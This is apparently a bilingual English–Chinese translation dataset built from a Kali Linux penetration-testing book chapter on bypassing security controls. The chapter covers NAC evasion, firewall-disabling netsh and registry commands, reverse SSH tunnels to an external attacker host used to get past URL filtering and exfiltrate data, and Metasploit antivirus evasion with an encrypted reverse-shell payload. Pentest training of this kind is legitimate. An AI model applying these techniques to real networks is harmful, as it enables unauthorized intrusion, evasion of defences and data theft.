- en: '9'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: '9'
- en: Bypassing Security Controls
  id: totrans-1
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 绕过安全控制
- en: The COVID-19 pandemic has led many organizations to switch completely to remote
    working in 2020, and this has significantly increased the risk associated with
    the endpoint devices that remote workers use. The rise of **Endpoint Detection
    and Response** (**EDR**) from early 2018 to now has emerged as a replacement for
    traditional antivirus software, due to the various types of security incidents,
    especially sophisticated ransomware and leakware. Having said that, most of the
    time, when testers get internal network access or highly privileged access, they
    think they are done with the test, assuming that they have the knowledge and toolset
    to completely compromise the network or enterprise.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: COVID-19 大流行促使许多组织在 2020 年全面转向远程办公，这大大增加了远程工作人员所使用的终端设备的风险。从 2018 年初至今，**终端检测与响应**（**EDR**）的兴起，已成为传统防病毒软件的替代品，尤其是针对各种类型的安全事件，特别是复杂的勒索病毒和泄密软件。话虽如此，大多数情况下，当测试人员获得内部网络访问或高度特权访问时，他们认为测试已经完成，假设他们具备完全入侵网络或企业的知识和工具。
- en: One of the neglected aspects during a penetration test activity is bypassing
    security controls to assess the target organization’s detection and prevention
    techniques. In all penetration testing activities, penetration testers or attackers
    need to understand what renders the exploit ineffective while performing an active
    attack on the target network/system, and bypassing the security controls that
    are set by the target organization becomes crucial as part of the cyber kill chain
    methodology. In this chapter, we will review the different types of security controls
    in place, identify a systematic process for overcoming these controls, and demonstrate
    this using the tools from the Kali toolset.
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 渗透测试活动中被忽视的一个方面是绕过安全控制，以评估目标组织的检测和防御技术。在所有渗透测试活动中，渗透测试员或攻击者需要了解在对目标网络/系统进行主动攻击时，什么因素会使漏洞失效，同时绕过目标组织设置的安全控制，成为网络杀链方法论的重要组成部分。在本章中，我们将回顾现有的各种安全控制，识别克服这些控制的系统化流程，并通过
    Kali 工具集中的工具来演示。
- en: 'In this chapter, you will learn about the following:'
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，你将学习以下内容：
- en: Bypassing **Network Access Control** (**NAC**)
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 绕过**网络访问控制**（**NAC**）
- en: Bypassing traditional **Antivirus** (**AV**)/**Endpoint Detection and Response**
    (**EDR**) **tools** using different tactics and techniques
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用不同策略和技术绕过传统的**防病毒**（**AV**）/**终端检测与响应**（**EDR**）**工具**
- en: Bypassing application-level controls
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 绕过应用层控制
- en: Understanding Windows-specific operating system security controls
  id: totrans-8
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 理解 Windows 特定操作系统的安全控制
- en: Let’s explore the different types of NAC and how to bypass them in the next
    section.
  id: totrans-9
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们在下一节中探讨不同类型的 NAC 以及如何绕过它们。
- en: Bypassing Network Access Control (NAC)
  id: totrans-10
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 绕过网络访问控制（NAC）
- en: NAC works on a basic form of the IEEE 802.1X standard. The majority of corporations
    implement NAC to protect network nodes, such as switches, routers, firewalls,
    servers, and, more importantly, endpoints. Decent NAC implies the controls that
    are put in place to prevent the intrusion by policies and also define who can
    access what. In this section, we will take a deep dive into different types of
    NAC that attackers or penetration testers encounter during an RTE or penetration
    test.
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: NAC 基于 IEEE 802.1X 标准的基本形式工作。大多数公司实施 NAC 来保护网络节点，如交换机、路由器、防火墙、服务器，更重要的是终端。优秀的
    NAC 表示实施的控制措施通过策略防止入侵，并定义谁可以访问什么。在本节中，我们将深入探讨渗透测试人员或攻击者在 RTE 或渗透测试过程中遇到的不同类型 NAC。
- en: 'There are no specific common criteria or standardization for NAC; it depends
    on the vendor and the way it is implemented. For example, Cisco provides Cisco
    Network Admission Control, and Microsoft provides Microsoft Network Access Protection.
    The primary purpose of NAC is to control the devices/elements, which can be connected,
    and then made sure that they are tested for compliance. NAC protections can be
    subdivided into two different categories:'
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: NAC 没有特定的共同标准或规范化；它取决于供应商和实施方式。例如，思科提供思科网络接入控制，微软提供微软网络接入保护。NAC 的主要目的是控制可以连接的设备/元素，并确保它们经过合规性测试。NAC
    保护可以细分为两类：
- en: Pre-admission NAC
  id: totrans-13
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 预接入 NAC
- en: Post-admission NAC
  id: totrans-14
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 后接入 NAC
- en: '*Figure 9.1* provides some mind map activities that can be performed by an
    attacker during an internal penetration test or post-exploitation phase as per
    the kill chain methodology:'
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 9.1* 提供了一些在内部渗透测试或后期利用阶段，按照杀伤链方法进行的攻击者思维导图活动：'
- en: '![Diagram  Description automatically generated](../Images/B17765_09_01.png)'
  id: totrans-16
  prefs: []
  type: TYPE_IMG
  zh: '![图表 说明自动生成](../Images/B17765_09_01.png)'
- en: 'Figure 9.1: A mind map of different NAC activities'
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.1：不同 NAC 活动的思维导图
- en: Pre-admission NAC
  id: totrans-18
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 预入网 NAC
- en: 'In pre-admission NAC, basically, all the controls are put in place by security
    requirements in order to add a new device to the network. The following sections
    explain the different approaches for bypassing them:'
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 在预入网 NAC 中，基本上，所有控制措施都由安全要求设定，以便将新设备添加到网络中。以下部分解释了绕过这些措施的不同方法：
- en: Adding new elements
  id: totrans-20
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 添加新元素
- en: Typically, any mature NAC deployment in a corporation would be able to identify
    any new elements (devices) added to the network. During a red teaming exercise
    or internal penetration testing, an attacker typically adds a device to a network
    such as the `pwnexpress` NAC and bypasses the restrictions set by the NAC by running
    Kali Linux on the device and maintaining shell access to the added device.
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 通常，任何成熟的 NAC 部署在企业中都能够识别网络中添加的任何新设备（元素）。在红队演练或内部渗透测试过程中，攻击者通常会向网络添加一个设备，如`pwnexpress`
    NAC，并通过在设备上运行 Kali Linux 并保持对该设备的 shell 访问，绕过 NAC 设置的限制。
- en: In the *Bypassing MAC address authentication and open authentication* section
    of *Chapter 6*, *Wireless and Bluetooth Attacks*, we saw how to bypass MAC address
    authentication and allow our system to admit the network through `macchanger`.
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: 在*第六章，*无线与蓝牙攻击*的*绕过 MAC 地址认证与开放认证*部分中，我们展示了如何通过`macchanger`绕过 MAC 地址认证，使我们的系统能够通过网络。
- en: Identifying the rules
  id: totrans-23
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 识别规则
- en: Understanding how the rules are applied is considered an art, especially when
    an internal system is hiding behind an NAT. For example, if you are able to provide
    your Kali attack boxes a link to the internal network either by means of a MAC
    filter bypass or by physically plugging in a LAN cable, you have now added the
    element to the corporate network with a local IP address, as shown in *Figure
    9.2*. DHCP information is automatically updated in your `/etc/resolv.conf` file.
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: 理解规则的应用方式被认为是一种艺术，尤其是当内部系统隐藏在 NAT 后面时。例如，如果你能够通过 MAC 地址过滤绕过或物理插入局域网电缆的方式将 Kali
    攻击箱连接到内部网络，你现在已经将该元素以本地 IP 地址添加到公司网络中，如*图 9.2*所示。DHCP 信息会自动更新到你的`/etc/resolv.conf`文件中。
- en: '![Text  Description automatically generated](../Images/B17765_09_02.png)'
  id: totrans-25
  prefs: []
  type: TYPE_IMG
  zh: '![文本 说明自动生成](../Images/B17765_09_02.png)'
- en: 'Figure 9.2: DHCP information on Kali Linux with internal DNS entries'
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.2：Kali Linux 上带有内部 DNS 条目的 DHCP 信息
- en: Many enterprises implement a DHCP proxy to protect themselves; this can be bypassed
    by adding a static IP address. Some routers will assign DHCP only after your device
    is authenticated through HTTP; this information can be captured by performing
    man-in-the-middle attacks.
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 许多企业实施了 DHCP 代理来保护自己；通过添加静态 IP 地址可以绕过这一措施。一些路由器会在你的设备通过 HTTP 认证后才分配 DHCP；通过执行中间人攻击可以捕获这些信息。
- en: Exceptions
  id: totrans-28
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
  zh: 例外
- en: We have noted, through our experiences, that many organization that have obvious
    exceptions to the list of rules, which are applied to their access control listing.
    For example, if the application service port is allowed to be accessed by a restricted
    IP range, an authenticated element or endpoint can mimic exceptions such as routing.
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: 我们通过经验发现，许多组织对其访问控制列表的规则存在明显的例外。例如，如果允许应用服务端口通过受限 IP 范围访问，则认证过的元素或端点可以模拟例如路由等例外。
- en: Quarantine rules
  id: totrans-30
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
  zh: 隔离规则
- en: Identification of quarantine rules during a penetration test will test the ability
    of the attacker to circumvent the security controls set by an organization.
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: 在渗透测试过程中识别隔离规则将测试攻击者绕过组织设定的安全控制的能力。
- en: Disabling endpoint security
  id: totrans-32
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 禁用端点安全
- en: One of the things that attackers can encounter during the pre-admission NAC
    is that when an element is non-compliant, the endpoint will be disabled. For example,
    an element trying to connect to the network without antivirus installed will be
    automatically quarantined and the network port/interface on the switch will be
    disabled.
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者在预入网 NAC 中可能遇到的一种情况是，当元素不符合要求时，端点将被禁用。例如，试图连接到没有安装 antivirus 的网络元素将被自动隔离，交换机上的网络端口/接口将被禁用。
- en: Preventing remediation
  id: totrans-34
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
  zh: 防止修复
- en: The majority of endpoints have antivirus and predefined remediation activities
    defined. For example, a specific device with a valid IP address performing a port
    scan will be blocked for a period of time and the traffic will be blocked by the
    antivirus software.
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: 大多数终端都有定义的防病毒软件和预定义的修复活动。例如，具有有效 IP 地址并进行端口扫描的特定设备将在一段时间内被阻止，且流量会被防病毒软件阻断。
- en: Adding exceptions
  id: totrans-36
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
  zh: 添加例外
- en: It is also important to add your own set of rules once you have access to the
    remote command shell. Testers can enable the remote desktop protocol by running
    `reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"
    /v fDenyTSConnections /t REG_DWORD /d 0 /f` in the windows command line as an
    administrator.
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦你获得了远程命令行的访问权限，添加一组规则也非常重要。测试人员可以通过以管理员身份在 Windows 命令行中运行`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal
    Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`来启用远程桌面协议。
- en: 'For example, you can utilize the `netsh` Windows command-line utility to add
    a remote desktop through the firewall by entering the following command:'
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，你可以利用`netsh` Windows 命令行工具，通过输入以下命令将远程桌面添加到防火墙中：
- en: '[PRE0]'
  id: totrans-39
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: 'Upon successful execution of the preceding command, attackers should be able
    to see the following figure:'
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: 在成功执行前述命令后，攻击者应能看到下图：
- en: '![](../Images/B17765_09_03.png)'
  id: totrans-41
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_09_03.png)'
- en: 'Figure 9.3: Adding a Windows remote desktop rule through a Windows firewall'
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.3：通过 Windows 防火墙添加远程桌面规则
- en: A non-stealthy way would be to disable all the profiles by running `netsh advfirewall
    set allprofiles state off`, or `netsh firewall set opmode disable` in older versions
    of Windows.
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: 一种非隐蔽的方式是通过运行`netsh advfirewall set allprofiles state off`，或在较早版本的 Windows 中运行`netsh
    firewall set opmode disable`来禁用所有配置文件。
- en: Post-admission NAC
  id: totrans-44
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 通过后入访问控制（NAC）
- en: Post-admission NAC is the set of devices that are already authorized and sit
    between the user switch and distribution switches. A notable protection that attackers
    can try to bypass is the firewall and intrusion prevention systems.
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: 后入 NAC 是一组已经被授权的设备，位于用户交换机和分布式交换机之间。攻击者可以尝试绕过的一项显著保护措施是防火墙和入侵防御系统。
- en: Bypassing isolation
  id: totrans-46
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 绕过隔离
- en: In the case of advanced host intrusion prevention, if the endpoint is missing
    security configurations or is compromised or infected, there might be a rule to
    isolate the endpoint in a particular segment. This will provide an opportunity
    for attackers to exploit all the systems in that particular segment.
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: 在高级主机入侵防御的情况下，如果终端缺少安全配置，或被妥协或感染，可能会有一个规则将该终端隔离在特定的段中。这将为攻击者提供机会，利用该特定段中的所有系统。
- en: Detecting a honeypot
  id: totrans-48
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 检测蜜罐
- en: We have even noticed that some companies have implemented advanced protection
    mechanisms, where signposting systems or servers that are infected are routed
    to a honeypot solution to set up a trap and uncover the actual motive behind the
    infection or attack.
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 我们甚至注意到，一些公司已经实施了高级保护机制，在这些机制中，被感染的系统或服务器会被引导到蜜罐解决方案，以设置陷阱并揭示感染或攻击背后的真正动机。
- en: Testers can identify these honeypot hosts as they typically respond with all
    ports open.
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
  zh: 测试人员可以通过通常会响应并且所有端口都开放的蜜罐主机来识别这些主机。
- en: Bypassing application-level controls
  id: totrans-51
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 绕过应用程序级别的控制
- en: Bypassing application controls is a straightforward activity after exploitation.
    Multiple application-level protections/controls are put in place. In this section,
    we will take a deep dive into common application-level controls and strategies
    to bypass them and establish a connection to the internet from the corporate network.
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: 在利用成功后，绕过应用程序控制是一个直接的操作。多种应用程序级别的保护/控制被实施。在本节中，我们将深入探讨常见的应用程序级别的控制措施以及绕过它们的策略，并从公司网络建立与互联网的连接。
- en: Tunneling past client-side firewalls using SSH
  id: totrans-53
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用 SSH 隧道绕过客户端防火墙
- en: One of the main things to learn after adding yourself to the internal network
    is how to tunnel past firewalls using SSH. We will now explore setting up a reverse
    tunnel to the attack box from the external internet by circumventing all the security
    controls put in place.
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: 在将自己添加到内部网络后，需要学习的主要内容之一是如何使用 SSH 绕过防火墙进行隧道连接。我们现在将探讨如何通过绕过所有已实施的安全控制来从外部互联网设置到攻击盒的反向隧道。
- en: Inbound to outbound
  id: totrans-55
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 从入站到出站
- en: In the following example, Kali Linux is running on the internet cloud at `18.x.x.74`
    and running the SSH service on port `443` (make sure you change your SSH settings
    to change the port number by editing `/etc/sshd_config` and `Port` to `443)`.
    From the internal corporate network, if all the ports are blocked at the firewall
    level, apart from ports `80` and `443`, this means insiders will be able to access
    the internet from the corporate network. Attackers would be able to utilize the
    remote Kali Linux by directly accessing the SSH service over port `443`. Technically,
    as far as the company is concerned, this is from the internal network to the internet.
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
  zh: 在以下示例中，Kali Linux 运行在位于 `18.x.x.74` 的互联网云上，并在 `443` 端口上运行 SSH 服务（确保您通过编辑 `/etc/sshd_config`
    文件并将 `Port` 设置为 `443` 来更改 SSH 设置）。如果内部企业网络上的所有端口在防火墙级别被阻止，除了端口 `80` 和 `443`，这意味着内部人员可以从企业网络访问互联网。攻击者则可以通过直接访问
    `443` 端口上的 SSH 服务利用远程 Kali Linux。技术上来说，就公司而言，这是从内部网络访问互联网。
- en: '![](../Images/B17765_09_04.png)Figure 9.4: Accessing remote Kali Linux through
    port 443'
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: '![](../Images/B17765_09_04.png)图 9.4：通过端口 443 访问远程 Kali Linux'
- en: Next, you should be able to use your Kali Linux machine on the cloud to communicate
    with the internal network.
  id: totrans-58
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，您应该能够在云上使用您的 Kali Linux 机器与内部网络进行通信。
- en: Bypassing URL filtering mechanisms
  id: totrans-59
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 绕过 URL 过滤机制
- en: You can utilize the existing SSH connection and port forwarding techniques to
    bypass any restrictions set by the security policy or special device in place.
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: 您可以利用现有的 SSH 连接和端口转发技术绕过由安全策略或特殊设备设置的任何限制。
- en: 'In the following example, it showcases that there is a URL filtering device
    in place that prevents us from accessing certain websites, as shown in the following
    *Figure 9.5*:'
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: 在以下示例中，展示了存在一个 URL 过滤设备，阻止我们访问某些网站，如以下 *图 9.5* 所示：
- en: '![](../Images/B17765_09_05.png)'
  id: totrans-62
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_09_05.png)'
- en: 'Figure 9.5: Domain content blocked from the URL filtering device'
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.5：URL 过滤设备阻止的域内容
- en: 'This can be bypassed using one of the tunneling tools; in this case, we will
    utilize portable software called PuTTY, which can be downloaded directly from
    [https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html):'
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: 可以使用隧道工具绕过此限制；在此示例中，我们将使用名为 PuTTY 的便携式软件，可以直接从 [https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)
    下载：
- en: Open the `putty.exe` application (most of the time, there will be no block on
    the portable executables) and connect to your remote host on port `443`, accept
    the certificate, and log in
  id: totrans-65
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 打开 `putty.exe` 应用程序（大多数情况下，便携式可执行文件不会被阻止），并连接到您的远程主机的 `443` 端口，接受证书并登录。
- en: Click on **Tunnels** from the **Connection** tab
  id: totrans-66
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在 **Connection** 标签中点击 **Tunnels**
- en: Enter the local port as `8090` and add the remote port as **Auto**, as shown
    in *Figure 9.6*:![](../Images/B17765_09_06.png)
  id: totrans-67
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 将本地端口设置为 `8090`，并将远程端口设置为 **自动**，如 *图 9.6* 所示：![](../Images/B17765_09_06.png)
- en: 'Figure 9.6: Setting the tunneling through existing SSH communication'
  id: totrans-68
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 9.6：通过现有 SSH 通信设置隧道
- en: This has now enabled internet access to your internal system using the SSH tunnel
    utilizing the external system’s setting, which means all the traffic on TCP port
    `8090` can now be forwarded through the external system at `18.x.x.74`.
  id: totrans-69
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 这现在已经启用了通过 SSH 隧道使用外部系统的设置访问您的内部系统的互联网，这意味着现在所有 TCP 端口 `8090` 上的流量都可以通过 `18.x.x.74`
    的外部系统转发。
- en: The next step is to go to **Internet Options** | **LAN connections** | **Advanced**
    | **SOCKs** and enter `127.0.0.1` in **Proxy address to use** and `8090` as the
    port, as shown in *Figure 9.7*:![Graphical user interface, application  Description
    automatically generated](../Images/B17765_09_07.png)
  id: totrans-70
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 下一步是进入 **Internet Options** | **LAN connections** | **Advanced** | **SOCKs**，并在
    **Proxy address to use** 中输入 `127.0.0.1`，端口设置为 `8090`，如 *图 9.7* 所示：![Graphical
    user interface, application  Description automatically generated](../Images/B17765_09_07.png)
- en: 'Figure 9.7: Setting the Socks IP to point to the proxy SSH tunnel'
  id: totrans-71
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 9.7：设置 Socks IP 指向代理 SSH 隧道
- en: Now that the proxy is pointed to the remote machine, you will be able to access
    the website without being blocked by the proxy or any URL filtering device, as
    shown in *Figure 9.8*.
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，代理已经指向远程主机，您将能够访问网站而不被代理或任何 URL 过滤设备阻止，如 *图 9.8* 所示。
- en: This way, penetration testers can bypass the URL filtering in place and also
    exfiltrate the data to the public cloud, the hacker’s hosted computer, or blocked
    websites.
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: 通过这种方式，渗透测试人员可以绕过现有的 URL 过滤并将数据外泄到公共云、黑客托管的计算机或被封锁的网站。
- en: '![](../Images/B17765_09_08.png)'
  id: totrans-74
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_09_08.png)'
- en: 'Figure 9.8: Successfully accessing the restricted domain'
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.8：成功访问受限域
- en: Upon bypassing the URL filtering mechanisms, attackers might be able to access
    sites that they control; for example, they might be able to place crypto-malware
    to mine the compute power of the hosting endpoint.
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: 绕过 URL 过滤机制后，攻击者可能能够访问他们控制的网站；例如，他们可能能够放置加密恶意软件以挖掘托管端点的计算能力。
- en: Outbound to inbound
  id: totrans-77
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 从外到内
- en: 'To establish a stable connection from external to internal systems, a tunnel
    must be established using SSH. In this case, we have a Kali Linux machine connected
    to the internal LAN that has a valid IP address. The following command will facilitate
    the creation of a tunnel from inside the network to the outside world. Prior to
    running it, testers must ensure to change the SSH configuration by editing `/etc/ssh/ssh_config`
    to set `GatewayPorts` to `yes` and restart the SSH service by running `sudo service
    ssh restart`:'
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: 要从外部系统建立到内部系统的稳定连接，必须使用 SSH 创建一个隧道。在这种情况下，我们有一台连接到内部局域网的 Kali Linux 机器，它具有有效的
    IP 地址。以下命令将帮助在网络内部创建一个隧道通向外部。在运行之前，测试者必须确保通过编辑 `/etc/ssh/ssh_config` 更改 SSH 配置，将
    `GatewayPorts` 设置为 `yes`，并通过运行 `sudo service ssh restart` 重启 SSH 服务：
- en: '[PRE1]'
  id: totrans-79
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: '*Figure 9.9* shows the login from an internal network to Kali Linux on the
    cloud machine using SSH, which has opened up a port `2210` on the local host to
    forward SSH:'
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 9.9* 显示了通过 SSH 从内部网络登录到云端机器上的 Kali Linux，该机器已经在本地主机上打开了 `2210` 端口来转发 SSH：'
- en: '![Text  Description automatically generated](../Images/B17765_09_09.png)'
  id: totrans-81
  prefs: []
  type: TYPE_IMG
  zh: '![文本 描述自动生成](../Images/B17765_09_09.png)'
- en: 'Figure 9.9: Creating a reverse SSH tunnel from the internal network to an external
    host'
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.9：从内部网络到外部主机创建反向 SSH 隧道
- en: 'This is done to establish a stable reverse connection to the remote host, using
    a reverse SSH tunnel to bypass any firewall restrictions. It will be stealthier
    if the attackers leverage common ports such as `80`, `8080`, `443`, and `8443`.
    Once the remote system is authenticated, run the following command from the remote
    host. This should provide you with internal network access while sitting outside
    the firewall:'
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 这样做是为了建立一个稳定的反向连接到远程主机，使用反向 SSH 隧道绕过任何防火墙限制。如果攻击者利用常见端口如`80`、`8080`、`443` 和
    `8443`，则将更加隐蔽。一旦远程系统验证通过，从远程主机运行以下命令。这应该能让你在防火墙外部仍能访问内部网络：
- en: '[PRE2]'
  id: totrans-84
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: '![](../Images/B17765_09_10.png)'
  id: totrans-85
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_09_10.png)'
- en: 'Figure 9.10: Successfully accessing the internal host through a reverse SSH
    tunnel from outside the firewall'
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.10：通过反向 SSH 隧道成功访问防火墙外部的内部主机
- en: When you have internal access, it is all about maintaining persistence to exfiltrate
    data and maintain access without triggering any firewall or network protection
    devices.
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: 拥有内部访问权限后，关键是保持持久性以便导出数据并保持访问，而不触发任何防火墙或网络保护设备。
- en: Bypassing the antivirus with files
  id: totrans-88
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 通过文件绕过杀毒软件
- en: The exploitation phase of the cyber kill chain is the most dangerous one for
    the penetration tester or attacker as they are directly interacting with the target
    network or system, and there is a high risk of their activity being logged or
    their identity being discovered. Again, stealth must be employed to minimize the
    risk to the tester. Although no specific methodology or tool is undetectable,
    there are some configuration changes and specific tools that will make detection
    more difficult.
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: 网络攻击链中的利用阶段对渗透测试者或攻击者来说是最危险的，因为他们直接与目标网络或系统互动，且存在很高的活动被记录或身份被发现的风险。因此，必须采用隐蔽手段以尽量减少对测试者的风险。虽然没有任何特定的工具或方法是无法被检测到的，但有一些配置更改和特定的工具可以使得检测变得更加困难。
- en: When considering remote exploits, most networks and systems employ various types
    of defensive controls to minimize the risk of attack. Network devices include
    routers, firewalls, intrusion detection and prevention systems, and malware detection
    software.
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 在考虑远程漏洞时，大多数网络和系统会采用各种防御控制措施，以最大限度地减少攻击风险。网络设备包括路由器、防火墙、入侵检测和防御系统以及恶意软件检测软件。
- en: To facilitate exploitation, most frameworks incorporate features to make the
    attack somewhat stealthy. The Metasploit framework allows you to manually set
    evasion factors on an exploit-by-exploit basis, determining which factors (such
    as encryption, port number, filenames, and others) may be difficult to identify
    and will change for each particular ID. The Metasploit framework also allows communication
    between the target and the attacking systems to be encrypted (the `windows/meterpreter/reverse_tcp_rc4`
    payload), making it difficult for the exploit payload to be detected.
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: 为了促进利用，大多数框架都集成了使攻击稍微隐秘的功能。Metasploit框架允许您手动设置每个漏洞的规避因素，确定哪些因素（如加密、端口号、文件名等）可能难以识别，并且会根据每个特定ID进行更改。Metasploit框架还允许将目标和攻击系统之间的通信加密（`windows/meterpreter/reverse_tcp_rc4`有效载荷），从而使漏洞利用载荷更难被检测。
- en: 'Metasploit Pro (Nexpose), available as a community edition on the Kali distribution,
    includes the following to specifically bypass intrusion detection systems:'
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit Pro（Nexpose），作为Kali发行版中的社区版，包含以下功能，专门用于绕过入侵检测系统：
- en: The scan speed can be adjusted in the **Discovery** **Scan** settings, reducing
    the speed of interaction with the target by setting the speed to sneaky or paranoid
  id: totrans-93
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 可以在**Discovery** **Scan**设置中调整扫描速度，通过将速度设置为“隐秘”或“偏执”，减少与目标的交互速度
- en: This implements transport evasion by sending smaller TCP packets and increasing
    the transmission time between the packets
  id: totrans-94
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 这通过发送更小的TCP数据包并增加数据包之间的传输时间来实现传输规避
- en: This reduces the number of simultaneous exploits launched against a target system
  id: totrans-95
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 这减少了同时对目标系统发起的攻击数量
- en: There are application-specific evasion options for exploits that involve DCERPC,
    HTTP, and SMB, which can be set automatically
  id: totrans-96
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 对于涉及DCERPC、HTTP和SMB的漏洞攻击，提供了特定于应用程序的规避选项，这些选项可以自动设置
- en: Most antivirus software relies on signature matching to locate viruses, ransomware,
    or any other malware. They examine each executable for strings of code known to
    be present in viruses (the signature) and create an alarm when a suspect string
    is detected. Many of Metasploit’s attacks rely on files that may possess a signature
    that, over time, has been identified by antivirus vendors.
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: 大多数杀毒软件依赖于特征匹配来定位病毒、勒索软件或其他恶意软件。它们会检查每个可执行文件中是否包含已知病毒特征的代码字符串（即特征），并在检测到可疑字符串时发出警报。Metasploit的许多攻击依赖于可能具有特征的文件，这些特征随着时间的推移被杀毒软件厂商识别。
- en: In response to this, the Metasploit framework allows standalone executables
    to be encoded to bypass detection.
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
